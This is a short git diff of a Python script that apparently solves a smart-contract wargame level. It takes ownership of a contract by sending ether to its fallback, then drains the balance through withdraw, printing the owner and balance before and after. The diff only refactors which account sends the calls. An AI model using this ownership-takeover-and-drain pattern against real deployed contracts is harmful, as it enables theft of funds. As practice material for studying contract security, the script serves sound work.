@@ -20,12 +20,13 @@ def main():
 
     print(f"\n--- The instance's owner before the exploit: {contract.owner()} ---\n")
 
-    contract.contribute(sender=user, value="1 wei")
-    assert contract.getContribution(sender=user) > 0, "contribute first"
-    user.transfer(instance, "1 wei")
-    assert contract.owner() == user.address, "!owner"
-    contract.withdraw(sender=user)
-    assert contract.balance == 0, "balance !zero"
+    with accounts.use_sender(user):
+        contract.contribute(value="1 wei")
+        assert contract.getContribution(sender=user) > 0, "contribute first"
+        user.transfer(instance, "1 wei")
+        assert contract.owner() == user, "!owner"
+        contract.withdraw()
+        assert contract.balance == 0, "balance !zero"
 
     print(f"\n--- The instance's balance after the exploit: {contract.balance} ---\n")
     print(f"\n--- The instance's owner after the exploit: {contract.owner()} ---\n")
